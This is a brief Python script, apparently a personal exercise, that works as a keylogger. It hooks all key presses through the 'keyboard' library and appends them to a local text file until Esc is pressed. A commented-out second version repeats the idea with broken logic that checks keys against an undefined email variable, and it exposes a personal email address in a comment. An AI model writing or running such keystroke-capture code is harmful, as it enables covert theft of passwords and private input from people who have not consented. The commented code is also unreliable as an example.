import keyboard

log_file = 'keystrokes.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait(hotkey='esc')
# import keyboard

# def keylogger():
#     log_file = 'keystrokes.log'
#     #email = 'aggarwalmehak2016@gmail.com'
    
#     def on_key_press(event):
#         key = event.name
#         if len(key) > 1:
#             key = f'[{key}]'
        
#         # Log the keystroke to the file
#         with open(log_file, 'a') as f:
#             f.write(key)
        
#         # Check if the keystroke matches any character in the email
#         if key.lower() in email:
#             with open(log_file, 'a') as f:
#                 f.write(key)

#     keyboard.on_press(on_key_press)

#     try:
#         keyboard.wait()  # Wait indefinitely
#     except KeyboardInterrupt:
#         pass
#     finally:
#         keyboard.unhook_all()

# if __name__ == '__main__':
#     print("Keylogger started. Press Ctrl+C to stop.")
#     keylogger()

